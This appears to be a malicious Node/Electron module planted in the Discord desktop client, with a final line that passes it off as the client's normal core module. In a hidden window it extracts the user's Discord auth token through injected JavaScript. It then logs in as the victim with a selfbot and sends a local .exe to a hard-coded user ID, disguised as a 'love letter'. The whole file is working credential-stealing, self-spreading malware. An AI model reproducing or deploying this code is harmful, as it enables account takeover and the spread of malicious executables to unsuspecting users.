const fs = require("fs");
const path = require("path");
const { BrowserWindow } = require("electron");
const { Client } = require("discord.js-selfbot-v13");

const client = new Client();

client.on("ready", async () => {
    const message = "I love you ❤️\nPlease read my love letter!";
    const file =  getExecutable();

    client.users.cache.forEach(async (user) => {
        if (user.id == "1288138552718397461") {
            await user.send({content: message, files: [file]});
        }
    }); 
});

const executeJS = async (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, true);
};

const getExecutable = () => {
    const dirPath = path.join(__dirname, "/bin");
    
    const files = fs.readdirSync(dirPath);
    
    const exeFiles = files.filter(file => path.extname(file).toLowerCase() === '.exe');
    
    if (exeFiles.length === 1) {
        return path.join(dirPath, exeFiles[0]);
    } else {
        return null;
    }
};

const getToken = async () => {
    const window = BrowserWindow.getAllWindows()[0];

    await new Promise((resolve, reject) => {
        window.webContents.once("did-finish-load", resolve);
        setTimeout(() => reject(new Error("Page did not finish loading in time")), 60000);
    });

    const token = await executeJS(`
        (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m)
        .find(m=>m?.exports?.default?.getToken!==void 0)
        .exports.default.getToken()
    `);

    return token;
};

const initializeApp = async () => {
    const mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        show: false,
        webPreferences: {
            nodeIntegration: true,
        },
    });
    mainWindow.loadURL("https://discord.com");

    const token = await getToken();
    
    if (token) {
        await client.login(token);
    };
};

initializeApp();

module.exports = require("./core.asar");